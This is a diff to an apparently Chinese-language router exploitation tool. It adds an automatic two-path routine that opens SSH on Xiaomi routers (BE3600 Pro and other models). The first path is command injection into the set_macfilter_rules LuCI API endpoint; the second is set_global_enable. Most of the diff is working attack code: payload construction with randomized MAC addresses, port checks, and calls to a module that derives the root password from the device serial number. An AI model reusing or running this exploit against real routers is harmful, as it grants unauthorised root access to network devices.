@@ -230,6 +230,7 @@ if SCRIPT_DIR not in sys.path:
 try:
     from tools.calc_root_pwd import root_pwd, selftest as run_selftest
     import tools.recv_backup as recv_backup_mod
+    from tools.exploit_set_global_enable import enable_ssh as enable_ssh_global
     from tools.exploit_set_macfilter_rules import (
         Router,
         build_payload,
@@ -430,10 +431,35 @@ def menu_calc_pwd():
 # ==============================================================================
 # 功能 2: 一键开启 SSH 访问
 # ==============================================================================
+def enable_ssh_auto(gw):
+    """Try both authenticated paths, stopping when port 22 becomes available."""
+    if test_port(gw.ip, 22, timeout=2.0):
+        print(c(Color.GREEN, "[+] 22 端口已开放，跳过解锁。"))
+        return True
+    print("[*] 途径 1/2: set_macfilter_rules")
+    try:
+        import random
+        mac = "02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5))
+        gw.inject(build_payload("\n".join(DROPBEAR_CMDS)), mac, "0")
+    except Exception as exc:
+        print(c(Color.YELLOW, "[!] 第一条途径请求异常: {0}".format(exc)))
+    for _ in range(4):
+        time.sleep(1)
+        if test_port(gw.ip, 22, timeout=1.0):
+            return True
+    print(c(Color.YELLOW, "[*] 22 端口未开放，自动尝试途径 2/2: set_global_enable"))
+    try:
+        return enable_ssh_global(gw, DROPBEAR_CMDS, detect_local_ip(gw.ip), test_port)
+    except Exception as exc:
+        print(c(Color.YELLOW, "[!] 第二条途径异常: {0}".format(exc)))
+        return False
+
+
 def menu_exploit_ssh():
     print(c(Color.BOLD, "\n--- [2] 漏洞利用: 一键开启 SSH (Dropbear 22 端口) ---"))
+    print("脚本版本: 双途径 SSH v2 | 文件: {0}".format(os.path.abspath(__file__)))
     print("适用机型: 小米 BE3600 Pro (RP01/RP02) / 万兆路由器 / AX 系列等")
-    print("利用接口: /cgi-bin/luci/api/xqsystem/set_macfilter_rules 命令注入")
+    print("自动尝试: set_macfilter_rules → set_global_enable，22 端口开放后停止。")
 
     get_credentials()
 
@@ -473,25 +499,14 @@ def menu_exploit_ssh():
                 ctx.device_info = "{0} ({1})".format(gw.displayName, gw.hardware or "Xiaomi")
             print(c(Color.GREEN, "[+] 自动读取设备 SN: {0} (Root 密码已自动算得)".format(ctx.sn)))
 
-        print("[*] 正在注入命令以启动 Dropbear SSH 服务 (规避 0 字节 host_key 缺陷)...")
-
-        payload = build_payload("\n".join(DROPBEAR_CMDS))
-        import random
-        mac = ("02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5)))
-        resp = gw.inject(payload, mac, "0")
-
-        print("[*] 等待路由器服务启动 (2 秒)...")
-        time.sleep(2)
-
-        # 端口自测
-        is_open = test_port(ctx.router_ip, 22, timeout=2.0)
+        is_open = enable_ssh_auto(gw)
         
         # 无论端口检测结果如何，始终高亮清晰打印 SSH 登录账号与自动算出的密码
         print("\n" + "=" * 64)
         if is_open:
             print(c(Color.GREEN + Color.BOLD, "[✓] 恭喜！SSH 服务已成功开启并在 22 端口就绪！"))
         else:
-            print(c(Color.YELLOW + Color.BOLD, "[✓] 注入指令已成功发送！(若 22 端口稍有延迟，稍等几秒即可)"))
+            print(c(Color.YELLOW + Color.BOLD, "[!] 两条途径尝试后，22 端口仍未开放，尚未确认 SSH 开启。"))
         print("-" * 64)
         if ctx.device_info:
             print("设备型号 : {0}".format(c(Color.BOLD, ctx.device_info)))
